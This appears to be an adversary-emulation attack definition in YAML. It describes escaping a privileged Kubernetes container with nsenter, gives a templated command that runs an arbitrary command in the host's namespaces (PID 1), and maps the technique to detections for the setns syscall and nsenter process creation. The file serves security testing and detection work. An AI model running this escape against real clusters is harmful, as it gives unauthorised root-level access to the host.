name: Escape container via NSenter
description: Container escape via the nsenter built-in linux program that allows
  executing a binary into another namespace.
tactic: "Privilege Escalation"
techniques: [ "Escape to Host", T1611 ]
preconditions:
  kind: System
  "Pod.securityContext.privileged": true
  accessLevel: "user-exec"
effects:
  - container.escape(sys)
parameters:
  TARGET:
    type: int
    default: 1
    description: the PID whose namespaces to enter
  MOUNT:
    type: bool
    default: true
    description: enter the target process mount namespace
  UTS:
    type: bool
    default: true
    description: enter the target process UTS namespace
  IPC:
    type: bool
    default: true
    description: enter the target process IPC namespace
  NET:
    type: bool
    default: true
    description: enter the target process network namespace
  PID:
    type: bool
    default: true
    description: enter the target process PID namespace
  CMD:
    type: string
    default: hostname
    description: the command to execute on the host
procedures:
  - key: nsenter
    command: >-
      nsenter --target ${TARGET}
      {% if MOUNT %}--mount{% endif %}
      {% if UTS %}--uts{% endif %}
      {% if IPC %}--ipc{% endif %}
      {% if NET %}--net{% endif %}
      {% if PID %}--pid{% endif %}
      ${CMD}
defend:
  - tactic: detect
    id: D3-SCA
    syscall: setns
  - tactic: detect
    id: D3-PSA
    process_creation: nsenter
references:
  - https://attack.mitre.org/techniques/T1611/
  - "[https://kubehound.io/reference/attacks/CE_NSENTER](KubeHound CE_NSENTER)"
